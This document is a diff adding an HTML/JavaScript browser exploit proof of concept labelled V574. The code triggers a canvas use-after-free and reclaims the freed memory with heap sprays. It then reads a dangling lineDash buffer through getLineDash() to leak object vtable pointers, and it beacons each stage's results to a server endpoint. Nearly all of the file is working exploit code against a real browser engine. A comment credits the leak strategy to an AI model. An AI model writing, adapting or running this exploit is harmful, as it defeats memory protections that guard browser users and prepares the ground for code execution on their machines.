@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V574</title></head>
+<body><pre id="out">V574 — dangling lineDash info leak</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V574-'+tag+'?d='+encodeURIComponent(String(body).slice(0,400))+'&t='+Date.now();}catch(e){}
+}
+
+var f64buf=new Float64Array(1);
+var u32buf=new Uint32Array(f64buf.buffer);
+function dblBits(d){f64buf[0]=d;return{lo:u32buf[0],hi:u32buf[1]};}
+function hex8(v){return('00000000'+((v>>>0).toString(16))).slice(-8);}
+function hexPair(hi,lo){return'0x'+hex8(hi)+hex8(lo);}
+function dblHex(d){var b=dblBits(d);return hexPair(b.hi,b.lo);}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var NDASH=+(P.get('dash')||'64');
+var NGRAD=+(P.get('grad')||'200');
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY+',dash='+NDASH+',grad='+NGRAD);
+say('BOOT: saves='+NSAVES+' spray='+NSPRAY+' dash='+NDASH+' grad='+NGRAD);
+
+/* ===== triggerUAF ===== */
+var innerCtx=null;
+function triggerUAF(){
+  var c=document.createElement('canvas');
+  c.width=1;c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d');
+    innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0;
+    return true;
+  }});
+  c.getContext('bitmaprenderer',d);
+  return c;
+}
+
+/* ===== PHASE 1: UAF + same-type reclaim (proven in V573) ===== */
+bk('PRE-UAF','triggering');
+var outerC=triggerUAF();
+bk('POST-UAF','ctx='+(innerCtx?'OK':'NULL'));
+
+var MARKER=7777.77;
+var sprayCanvases=[];
+var sprayCtxs=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas');
+  sc.width=1;sc.height=1;
+  var sctx=sc.getContext('2d');
+  if(sctx){
+    sctx.lineWidth=MARKER;
+    sprayCanvases.push(sc);
+    sprayCtxs.push(sctx);
+  }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+var lwCheck=null;
+try{lwCheck=innerCtx.lineWidth;}catch(e){bk('DEAD','lineWidth-crash:'+e.message);say('DEAD at lineWidth');throw e;}
+if(lwCheck!==MARKER){bk('NO-RECLAIM','lw='+lwCheck);say('No reclaim: lw='+lwCheck);}
+else{bk('RECLAIM','OK');}
+
+/* ===== PHASE 2: dangling lineDash read ===== */
+/* Strategy (DeepSeek #1):
+   1. Set big lineDash on wrapper A → allocates heap buffer P1 (NDASH*8 bytes)
+   2. save() → State copied, includes m_buffer=P1 + m_size=NDASH
+   3. setLineDash([]) → frees P1
+   4. restore() → current state has m_buffer=P1(freed), m_size=NDASH
+   5. Spray P1's size class with CanvasGradient objects (vtable at +0)
+   6. getLineDash() → reads NDASH doubles from new occupant → leaks vtable
+*/
+
+bk('PHASE2','dangling-lineDash-start');
+say('Phase 2: dangling lineDash read');
+
+var dashArr=[];
+for(var i=0;i<NDASH;i++) dashArr.push(i+1);
+
+try{
+  innerCtx.setLineDash(dashArr);
+  bk('DASH-SET','n='+NDASH);
+  say('setLineDash('+NDASH+' entries)');
+}catch(e){bk('DASH-SET-ERR',e.message);say('setLineDash ERR: '+e.message);}
+
+var preCheck=null;
+try{
+  preCheck=innerCtx.getLineDash();
+  bk('DASH-PRE','len='+preCheck.length+',v0='+preCheck[0]+',vN='+preCheck[preCheck.length-1]);
+  say('pre-check: getLineDash len='+preCheck.length);
+}catch(e){bk('DASH-PRE-ERR',e.message);}
+
+try{
+  innerCtx.save();
+  bk('SAVE-OK','saved-with-dash');
+}catch(e){bk('SAVE-ERR',e.message);}
+
+try{
+  innerCtx.setLineDash([]);
+  bk('DASH-CLEAR','freed-P1');
+  say('setLineDash([]) — freed dash buffer P1');
+}catch(e){bk('DASH-CLEAR-ERR',e.message);}
+
+try{
+  innerCtx.restore();
+  bk('RESTORE-OK','state-has-freed-P1');
+  say('restore() — state now holds freed P1 pointer');
+}catch(e){bk('RESTORE-ERR',e.message);}
+
+/* Spray P1's size class with CanvasGradient objects.
+   P1 was NDASH*8 bytes = 512 bytes for NDASH=64.
+   createLinearGradient returns a CanvasGradient — C++ object with vtable at +0.
+   Spray into the same size class to reclaim P1's memory. */
+
+bk('GRAD-SPRAY','n='+NGRAD+',dashBytes='+(NDASH*8));
+say('Spraying '+NGRAD+' gradients ('+NDASH*8+'B size class)');
+
+var gradients=[];
+for(var i=0;i<NGRAD;i++){
+  try{
+    var g=innerCtx.createLinearGradient(0,0,i+1,i+1);
+    g.addColorStop(0,'red');
+    g.addColorStop(1,'blue');
+    gradients.push(g);
+  }catch(e){}
+}
+bk('GRAD-DONE','n='+gradients.length);
+
+/* Also spray with small ArrayBuffers of same size as canary */
+var abSpray=[];
+for(var i=0;i<100;i++){
+  try{
+    var ab=new ArrayBuffer(NDASH*8);
+    var fv=new Float64Array(ab);
+    for(var j=0;j<NDASH;j++) fv[j]=0xDEADBEEF+j;
+    abSpray.push(ab);
+  }catch(e){}
+}
+bk('AB-SPRAY','n='+abSpray.length);
+
+/* ===== PHASE 3: the leak read ===== */
+bk('LEAK-READ','attempting');
+say('Reading getLineDash() through freed buffer...');
+
+var leaked=null;
+try{
+  leaked=innerCtx.getLineDash();
+  bk('LEAK-LEN','n='+leaked.length);
+  say('getLineDash returned '+leaked.length+' entries');
+}catch(e){
+  bk('LEAK-ERR',e.message);
+  say('getLineDash CRASHED: '+e.message);
+}
+
+if(leaked && leaked.length>0){
+  var hexDump='';
+  var nonZero=0;
+  var nonOriginal=0;
+  for(var i=0;i<leaked.length && i<NDASH;i++){
+    var v=leaked[i];
+    var h=dblHex(v);
+    if(v!==0) nonZero++;
+    if(v!==(i+1)) nonOriginal++;
+    hexDump+=i+':'+h+' ';
+    if(i<8){
+      say('  ['+i+'] = '+v+' ('+h+')');
+    }
+  }
+
+  bk('LEAK-STATS','nonZero='+nonZero+',nonOrig='+nonOriginal+',total='+leaked.length);
+  bk('LEAK-HEX0',hexDump.slice(0,400));
+  if(hexDump.length>400) bk('LEAK-HEX1',hexDump.slice(400,800));
+  if(hexDump.length>800) bk('LEAK-HEX2',hexDump.slice(800,1200));
+
+  say('nonZero='+nonZero+' nonOriginal='+nonOriginal);
+
+  if(nonOriginal>0 && nonZero>0){
+    bk('LEAK-CANDIDATE','POSSIBLE-LEAK');
+    say('*** POSSIBLE INFO LEAK — values differ from original dash ***');
+    var b0=dblBits(leaked[0]);
+    if(b0.hi>0x7f000000 || (b0.hi>0 && b0.hi<0x00010000)){
+      bk('PTR-CANDIDATE','v0='+dblHex(leaked[0]));
+      say('*** leaked[0] looks like a pointer! ***');
+    }
+  } else if(nonOriginal===0){
+    bk('LEAK-STALE','original-values-still-present');
+    say('Original dash values still present — buffer NOT reclaimed');
+  } else {
+    bk('LEAK-ZERO','all-zeros');
+    say('All zeros — buffer reclaimed but zero-init (bmalloc)');
+  }
+}
+
+/* Also try reading through wrapper B (sprayCtxs[9]) */
+var aliasCheck=null;
+try{
+  aliasCheck=sprayCtxs[9].getLineDash();
+  bk('ALIAS-DASH','len='+aliasCheck.length);
+}catch(e){bk('ALIAS-DASH-ERR',e.message);}
+
+bk('DONE','complete');
+say('V574 complete.');
+</script>
+</body>
+</html>
